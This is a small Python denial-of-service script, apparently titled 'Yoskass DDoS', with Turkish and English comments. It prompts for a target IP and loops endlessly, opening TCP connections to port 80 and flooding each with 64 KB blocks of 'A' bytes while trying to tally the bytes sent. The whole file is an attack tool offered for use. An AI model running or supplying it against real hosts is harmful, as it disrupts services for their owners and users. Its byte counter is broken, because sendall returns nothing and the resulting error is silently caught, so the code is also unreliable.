import socket
import time
print('''
                                                                                                                             
                                   #                         ######   ######                  
 #   #   ####    ####   #    #    # #     ####    ####       #     #  #     #   ####    ####  
  # #   #    #  #       #   #    #   #   #       #           #     #  #     #  #    #  #      
   #    #    #   ####   ####    #     #   ####    ####       #     #  #     #  #    #   ####  
   #    #    #       #  #  #    #######       #       #      #     #  #     #  #    #       # 
   #    #    #  #    #  #   #   #     #  #    #  #    #      #     #  #     #  #    #  #    # 
   #     ####    ####   #    #  #     #   ####    ####       ######   ######    ####    ####   
                                                                            
                                                                            

''')
# Kullanıcıdan IP adresini alın
ip = input("Hedef IP adresini girin: ")

# Define port number, message size in bytes, and sending interval (in seconds)
port = 80
msg_size = 64 * 1024    # Set message size as 64 KB
interval = 1            # Send one packet per second

total_sent = 0   # Toplam gönderilen veri miktarını takip etmek için değişken tanımlayın

while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((ip, port))

            data = b'A' * msg_size     # Create a large string containing 'A's
            start_time = time.time()   # Start timer
            while ((time.time() - start_time) < interval):
                sent = s.sendall(data)      # Send packets continuously until the specified interval has elapsed
                total_sent += sent          # Gönderilen veri miktarını toplam gönderilen veriyle güncelle
        except Exception as e:
            print("Error:", str(e))
    
    # Gönderilen veri miktarını ekrana yazdır
    print("Toplam gönderilen veri miktarı:", total_sent)
